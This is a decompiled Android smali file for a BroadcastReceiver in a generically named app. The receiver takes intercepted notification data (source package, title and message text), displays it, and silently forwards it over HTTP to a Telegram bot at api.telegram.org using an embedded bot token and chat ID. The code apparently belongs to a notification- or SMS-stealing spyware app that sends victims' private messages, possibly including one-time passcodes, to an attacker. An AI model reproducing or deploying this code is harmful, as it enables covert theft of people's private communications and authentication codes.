.class Lcom/example/appjava/MainActivity$1;
.super Landroid/content/BroadcastReceiver;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/example/appjava/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/appjava/MainActivity;


# direct methods
.method constructor <init>(Lcom/example/appjava/MainActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/example/appjava/MainActivity$1;->this$0:Lcom/example/appjava/MainActivity;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9

    const-string v0, "package"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "title"

    invoke-virtual {p2, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "text"

    invoke-virtual {p2, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "id"

    invoke-virtual {p2, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Landroid/widget/TableRow;

    iget-object v5, p0, Lcom/example/appjava/MainActivity$1;->this$0:Lcom/example/appjava/MainActivity;

    invoke-virtual {v5}, Lcom/example/appjava/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/widget/TableRow;-><init>(Landroid/content/Context;)V

    new-instance v5, Landroid/widget/TableRow$LayoutParams;

    const/4 v6, -0x1

    const/4 v7, -0x2

    invoke-direct {v5, v6, v7}, Landroid/widget/TableRow$LayoutParams;-><init>(II)V

    invoke-virtual {v4, v5}, Landroid/widget/TableRow;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v4, Landroid/widget/TextView;

    iget-object v5, p0, Lcom/example/appjava/MainActivity$1;->this$0:Lcom/example/appjava/MainActivity;

    invoke-virtual {v5}, Lcom/example/appjava/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    new-instance v5, Landroid/widget/TableRow$LayoutParams;

    const/high16 v6, 0x3f800000    # 1.0f

    invoke-direct {v5, v7, v7, v6}, Landroid/widget/TableRow$LayoutParams;-><init>(IIF)V

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    const/high16 v5, 0x41400000    # 12.0f

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->setTextSize(F)V

    const-string v5, "#000000"

    invoke-static {v5}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v5

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->setTextColor(I)V

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "From : "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " | Message : </b>"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v5, p0, Lcom/example/appjava/MainActivity$1;->this$0:Lcom/example/appjava/MainActivity;

    iget-object v5, v5, Lcom/example/appjava/MainActivity;->client:Lokhttp3/OkHttpClient;

    new-instance v6, Lokhttp3/Request$Builder;

    invoke-direct {v6}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "https://api.telegram.org/bot"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v8, p0, Lcom/example/appjava/MainActivity$1;->this$0:Lcom/example/appjava/MainActivity;

    iget-object v8, v8, Lcom/example/appjava/MainActivity;->token:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "/sendMessage?parse_mode=markdown&chat_id="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v8, p0, Lcom/example/appjava/MainActivity$1;->this$0:Lcom/example/appjava/MainActivity;

    iget-object v8, v8, Lcom/example/appjava/MainActivity;->id:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&text=*"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "* %0A%0A*From :* _"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "_%0A*Message :* _"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "_"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v6

    invoke-virtual {v6}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v6

    invoke-virtual {v5, v6}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v5

    new-instance v6, Lcom/example/appjava/MainActivity$1$1;

    invoke-direct {v6, p0}, Lcom/example/appjava/MainActivity$1$1;-><init>(Lcom/example/appjava/MainActivity$1;)V

    invoke-interface {v5, v6}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    return-void
.end method
